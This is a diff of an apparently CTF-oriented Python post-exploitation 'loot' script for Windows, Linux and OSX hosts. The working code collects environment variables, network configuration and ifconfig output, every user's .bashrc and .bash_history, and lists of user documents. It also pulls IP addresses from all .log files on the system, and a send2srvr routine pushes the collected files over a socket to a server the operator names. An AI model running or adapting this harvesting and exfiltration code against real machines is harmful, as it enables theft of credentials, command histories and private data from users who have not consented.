@@ -1,5 +1,4 @@
-import re, sys, os, platform
-import ipaddress, socket, zipfile
+import re, sys, os, platform, ipaddress, socket, zipfile
 from subprocess import Popen, PIPE
 
 #
@@ -7,7 +6,7 @@ from subprocess import Popen, PIPE
 #               a local looting script in Python for Win/Lin/OSX hosts
 #
 #       Eric Valenzuela, eevn.io
-#       June 20, 2017
+#       June 28, 2017
 #
 
 ### Main Menu --start--
@@ -69,56 +68,104 @@ def lootme_windows(outfiles):
         hostloot = ((platform.uname()[1])+"_loot.txt")
     outfiles.append(hostloot)
     with open(hostloot, 'w') as outFile:
-        # Dump machine information
-        outFile.write('Machine info:\n')
-        outFile.write(platform.uname()[1]+'\n'+platform.system()+'\n'+platform.release()+'\n'+platform.version()+'\n')
-        # Dump environment variables
-        outFile.write("Environment vars:\n"+str(os.environ)+'\n')
+        # Dump machine info
+        machine_info(outFile)
         
     return
 ### lootme_windows --end--
 
 ### lootme_linux --start--
 def lootme_linux(outfiles):
-    userdirs = os.listdir('/home/')
     hostloot = (platform.uname()[1]+'_loot.txt')
     outfiles.append(hostloot)
     with open(hostloot, 'w') as outFile:
-        
-        # Dump machine information
-        outFile.write('Machine info:\n')
-        outFile.write(platform.uname()[1]+'\n'+platform.system()+'\n'+platform.release()+'\n'+platform.version()+'\n')
-        # Dump environment variables
-        outFile.write("Environment vars:\n"+str(os.environ)+'\n')
-
+        # gather machine info
+        machine_info(outFile)
+        #gather network info
+        network_info(outFile)
         # search user files for extractable data
-        for d in userdirs:
-            outFile.write('\nUser: '+d+'\n')
-            
-            # search bashrc files for alias designations
-            with open(('/home/'+str(d)+'/.bashrc'), 'r') as bashrc:
-                outFile.write('\n.bashrc file:\n')
-                content = bashrc.readlines()
-                for line in content:
-                    if re.match('[.]*alias [.]*', line):
-                        outFile.write(line)
-            
+        userdata_extract_lin(outFile)
         # search for list of user files
-        userfiles = (platform.uname()[1]+'_userFiles.txt')
-        outfiles.append(userfiles)
-        with open(userfiles, 'w') as ufs:
-            ufs.write('\nFiles discovered:')
-            for d in userdirs:
-                for path, subdirs, files in os.walk('/home/'+d):
-                    for name in files:
-                        # search user directories for specified filetypes:
-                        #   pdf, txt, doc(x)
-                        if re.search('[.]*\.pdf', name) or re.search('[.]*\.txt', name) or re.search('[.]*\.doc[.]{1}', name):
-                            ufs.write('\n'+os.path.join(path, name)+'\n')
-
+        outfiles = userfiles_list_lin(outfiles)
         # search entire os for .log files, and grab all unique IP addresses
-        unique_ips = [None]
-        for path, subdirs, files in os.walk('/'):
+        logfile_ips(outFile)
+        
+    return outfiles
+### lootme_linux --end--
+
+### Machine info --start--
+def machine_info(outFile):
+    # Dump machine information
+    outFile.write('Machine info:\n')
+    outFile.write(platform.uname()[1]+'\n'+platform.system()+'\n'+platform.release()+'\n'+platform.version()+'\n')
+    # Dump environment variables
+    outFile.write("Environment vars:\n"+str(os.environ)+'\n')
+### Machine info --end--
+
+### Network info Linux --start--
+def network_info(outFile):
+    if os.path.isfile('/etc/sysconfig/network'):
+        filecontents_grab(outFile,  '/etc/sysconfig/network')
+       
+    if os.path.isfile('/etc/resolv.conf'):
+        filecontents_grab(outFile, '/etc/resolv.conf')
+        
+    try:
+        path = '/etc/sysconfig/network-scripts/'
+        interfaces = os.listdir(path)
+        for file in interfaces:
+            if re.search('^ifcfg-[.]*',  file):
+                if os.path.isfile((path+file)):
+                    filecontents_grab(outFile,  os.path.join(path,  file))
+    except:
+        print('/etc/sysconfig/network-scripts/ is not present or accessible')
+        
+    try:
+        outFile.write('\nifconfig output:\n')
+        p = Popen(["ifconfig"],  stdout=PIPE)
+        (output,  err) = p.communicate()
+        exit_code = p.wait()
+        for line in output:
+            outFile.write(line)
+    except:
+        print('Error executing ifconfig')
+### Network info Linux --end--
+
+### User data extraction Linux --start--
+def userdata_extract_lin(outFile):
+    userdirs = os.listdir('/home/')
+    for d in userdirs:
+            outFile.write('\nUser: '+d+'\n')
+            path = '/home/'+str(d)+'/'
+            # search bashrc files for alias designations
+            if os.path.isfile((path+'.bashrc')):
+                filecontents_grab(outFile,  os.path.join(path,  '.bashrc'))
+            # grab bash history
+            if os.path.isfile((path+'.bash_history')):
+                filecontents_grab(outFile,  os.path.join(path,  '.bash_history'))
+### User data extraction --end--
+
+### User files list Linux --start--
+def userfiles_list_lin(outfiles):
+    userdirs = os.listdir('/home/')
+    userfiles = (platform.uname()[1]+'_userFiles.txt')
+    outfiles.append(userfiles)
+    with open(userfiles, 'w') as ufs:
+        ufs.write('\nFiles discovered:')
+        for d in userdirs:
+            for path, subdirs, files in os.walk('/home/'+d):
+                for name in files:
+                    # search user directories for specified filetypes:
+                    #   pdf, txt, doc(x)
+                    if re.search('[.]*\.pdf', name) or re.search('[.]*\.txt', name) or re.search('[.]*\.doc[.]{1}', name):
+                        ufs.write('\n'+os.path.join(path, name)+'\n')
+    return outfiles
+### User files list --end--
+
+###  Log file IPs --start--
+def logfile_ips(outFile):
+    unique_ips = [None]
+    for path, subdirs, files in os.walk('/'):
             for name in files:
                 if re.search('[.]*\.log', name):
                     #print('log file: ' + name)
@@ -130,21 +177,22 @@ def lootme_linux(outfiles):
                                 ips  = re.findall('((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])\.(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])\.(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])\.(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9]))', line)
                                 if ips is not None:
                                     for ip in ips:
-                                        if ip not in unique_ips:
-                                            #print(str(ip))
+                                        #if ip not in unique_ips and isinstance(ip, basestring) and re.search('\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', ip):
+                                        if ip[0] not in unique_ips:
+                                            #print(str(ip[0]))
                                             if unique_ips == [None]:
-                                                unique_ips = [ip]
+                                                unique_ips = [ip[0]]
                                             else:
-                                                unique_ips.append(ip)
+                                                unique_ips.append(ip[0])
                     except IOError:
-                        print('IO Error. Likely do not have read permissions.')
-        if unique_ips is not [None]:
+                        print('IO Error. Likely do not have read permissions for '+name)
+    if unique_ips is not [None]:
             outFile.write('\nUnique IPs from logs:\n')
             unique_ips.sort()
             for ip in unique_ips:
                 outFile.write(str(ip)+'\n')
-    return outfiles
-### lootme_linux --end--
+    return
+### Log file IPs --end--
 
 ### lootme_osx --start--
 def lootme_osx():
@@ -185,7 +233,12 @@ def send2srvr(outfiles):
     port = input()
     sock = socket.socket()
     print('\nEnter server IP')
-    host = str(raw_input())
+    if sys.version_info < (3,  0):
+        host = str(raw_input())
+    elif sys.version_info > (3, 0):
+        host = str(input())
+    else:
+        print('Invalid Python version detected!')
 
     files = os.listdir('./')
     for f in files:
@@ -262,6 +315,18 @@ def flaghunt(outfiles):
                     outFile.write(os.path.join(path, name)+'\n')
     return outfiles
 ### flag hunt --end--
+
+### grab file contents --start--
+def filecontents_grab(outFile,  contentfile):
+    try:
+        with open(contentfile, 'r') as cf:
+            outFile.write('\n.'+str(contentfile)+' file:\n')
+            content = cf.readlines()
+            for line in content:
+                outFile.write(line)
+    except:
+        print('Error reading from '+contentfile+' file.')
+### grab file contents --end--
 
 ### Program init --start--
 mainmenu()
